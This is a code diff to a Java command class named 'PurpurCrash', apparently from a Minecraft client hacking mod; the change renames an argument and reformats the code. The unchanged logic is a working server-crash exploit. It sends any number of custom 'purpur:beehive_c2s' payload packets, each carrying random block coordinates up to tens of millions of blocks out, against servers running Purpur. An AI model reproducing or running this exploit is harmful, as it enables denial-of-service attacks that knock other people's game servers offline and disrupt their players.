@@ -15,23 +15,21 @@ public class PurpurCrash extends BetterCommand {
     @Override
     public void build(LiteralArgumentBuilder<CommandSource> builder) {
         builder.then(
-            argument("strength", IntegerArgumentType.integer(1))
+            argument("packets", IntegerArgumentType.integer(1))
                 .executes(this::run)
         );
     }
 
     private int run(CommandContext<CommandSource> ctx) {
-        int packets = IntegerArgumentType.getInteger(ctx, "strength");
+        int packets = IntegerArgumentType.getInteger(ctx, "packets");
         info("Sending %d packet(s)".formatted(packets));
         for (int i = 0; i < packets; i++) {
             int x = (int) ((Math.random() - 0.5) * 60_000_000);
             int y = (int) ((Math.random() - 0.5) * 60_000_000);
-            sendPacket(createCustomPayloadPacket(
-                buf -> {
-                    long l = new BlockPos(x, (int) (Math.random() * 4 + 250), y).asLong();
-                    buf.writeLong(l);
-                }, new Identifier("purpur", "beehive_c2s")
-            ));
+            sendPacket(createCustomPayloadPacket(buf -> {
+                long l = new BlockPos(x, (int) (Math.random() * 4 + 250), y).asLong();
+                buf.writeLong(l);
+            }, new Identifier("purpur", "beehive_c2s")));
         }
         return SUCCESS;
     }
